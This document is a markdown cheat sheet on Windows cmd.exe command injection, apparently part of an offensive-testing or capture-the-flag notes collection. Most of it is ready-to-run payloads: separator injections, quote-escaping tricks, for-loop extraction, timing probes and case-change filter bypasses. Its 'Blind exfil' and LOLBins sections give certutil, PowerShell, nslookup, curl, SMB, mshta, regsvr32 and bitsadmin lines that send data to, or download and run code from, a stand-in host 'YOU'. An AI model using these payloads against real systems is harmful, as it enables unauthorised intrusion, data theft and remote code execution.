# Windows Command Injection — cmd.exe and the rest

## Separators — cmd.exe grammar

| Sep | Meaning |
|---|---|
| `&` | run next unconditionally |
| `&&` | run next on success |
| `\|\|` | run next on failure |
| `\|` | pipe |
| `%` | var expansion `%VAR%` |
| `!VAR!` | delayed expansion |
| `^` | escape char — `^&` escapes `&` |

NO `;`, NO `` ` ``, NO `$( )` — cmd grammar is different.

## cmd.exe payloads

```cmd
x & whoami
x && whoami
x | whoami
x || whoami
x & type C:\flag.txt
x & dir C:\
x & ipconfig /all
x & net user
```

`type` = `cat`, `dir` = `ls`, `copy` = `cp`, `move` = `mv`, `del` = `rm`,
`findstr` = `grep`, `more` = pager, `whoami`/`hostname`/`ipconfig`/`netstat`
for recon.

## Quoting — cmd only knows `"`

- `'` is a literal char — `';id` doesn't close anything
- `"` toggles quoted state — `"; whoami &"` closes+injects+reabsorbs
- `%VAR%` expands — `%COMSPEC%`/`%PATH%`/`%USERNAME%` — env introspection
- `!VAR!` delayed expansion inside `cmd /v` or for-loops
- `^` escapes: `^&`, `^|`, `^<`, `^>`, `^%`, `^"`, `^^`

## cmd escaping oddities — `^` and `%` semantics

- `%%` in batch = `%` literal; `^%` escapes
- `%x%` expands `x` env var — `%HOMEPATH:~0,1%` substring syntax →
  `:` + `~offset,len` — `variable-tricks.md` windows form
- `for /f`/`for %%i in (...) do` — loop-execute in a single line
- `set /p x=<file` — read file into var

## For-loop exec — `for /f`

```cmd
for /f %i in ('whoami') do @echo %i
for /f "delims=" %i in ('type C:\flag.txt') do @echo %i
```

The `for /f` `('cmd')` form runs the command and iterates output — the
workhorse for extraction inside a constrained shell.

## Detection — Windows signals

- `Server: Microsoft-IIS`, `ASP.NET` headers
- errors `The system cannot find`, `'x' is not recognized`, `Bad command`
- responses with `C:\`, `Windows`, `Volume in drive`
- `win.ini`/`boot.ini`/`C:\Windows\System32\drivers\etc\hosts` readable
- `dir`/`type`/`ipconfig` output format
- `&` works but `;` doesn't (POSIX `;` is NOT a separator in cmd)

## cmd vs PowerShell — which context?

- `cmd.exe` spawn → cmd grammar
- `powershell.exe`/`pwsh.exe` spawn → PS grammar — `powershell-injection.md`
- `Process.Start("cmd","/c "+x)` → cmd `/c` context
- `Process.Start("powershell",x)` → PS context

`cmd` errors `is not recognized as an internal or external command`;
PS errors `is not recognized as a cmdlet`.

## `ping`/`timeout` for timing — Windows delay commands

```cmd
x & ping -n 6 127.0.0.1       — ~5s delay (n-1 seconds)
x & timeout /t 5 /nobreak
x & powershell -c "sleep 5"
x & choice /t 5 /d y /n >nul
```

`ping -n N` ≈ (N-1) seconds. `timeout` needs `/nobreak` for stdin-less.

## Blind exfil — Windows OOB

```cmd
x & certutil -urlcache -f http://YOU/x C:\x
x & powershell -c "iwr http://YOU/$(hostname)"
x & nslookup %COMPUTERNAME%.YOU
x & curl http://YOU/%USERNAME%
x & copy C:\flag.txt \\YOU\share\  — SMB
```

## The `/c` vs `/k` — cmd wrapper flags

`cmd /c cmdline` — run and exit. `cmd /k` — run and stay. The wrapper
`/c`/`/k` decides the args split — `cmd /c "a & b"` runs both.

## Case-insensitive — `WHOAMI`=`whoami`, `DIR`=`dir`

Windows commands case-insensitive — `WHoAmI` works. Filters checking
`whoami` lowercase miss `WHOAMI` — a real bypass family unique to
Windows.

## `more`/`type`/`findstr`/`fc` — the read builtins

```cmd
type C:\flag.txt
more C:\flag.txt
findstr /n . C:\flag.txt
fc /b file1 file2
```

## `certutil` — the native encode/decode/download tool

```cmd
certutil -encode x x.b64     — base64 encode a file
certutil -decode x.b64 x     — decode
certutil -urlcache -f http://YOU/x x — download
certutil -hashfile x MD5     — hash
```

The "Windows curl+base64+download" swiss knife — high value.

## `bitsadmin`/`mshta`/`rundll32`/`regsvr32`/`msbuild`/`cscript`/`wscript` — LOLBins

```
mshta http://YOU/x.hta                  — run HTA
rundll32 url.dll,FileProtocolHandler http://YOU/
regsvr32 /s /n /u /i:http://YOU/x.sct scrobj.dll
msbuild x.csproj
cscript //E:jscript x.js
wscript x.vbs
bitsadmin /transfer x http://YOU/x C:\x
```

Living-off-the-land exec/download builtins — for the exec-after-landing
case more than pure cmdi injection (though a `& mshta ...` injection
works too).

## The `cmd` pipe-exec — `|` inside cmd

`x | whoami` — pipe into whoami's stdin — same POSIX semantics.

## Escaped-quote juggling — `";cmd;"` style

`"` closes/reopens quoted state; `";whoami;"` inside `"x"` →
`"x";whoami;"` — runs `whoami` outside quotes.

## Falsifiers

- argv boundary (`ProcessStartInfo` argv form) AND no flags accepted
- PowerShell Constrained Language mode AND no native tools

## Output to record

- cmd vs PowerShell identified + verbatim error/output sample
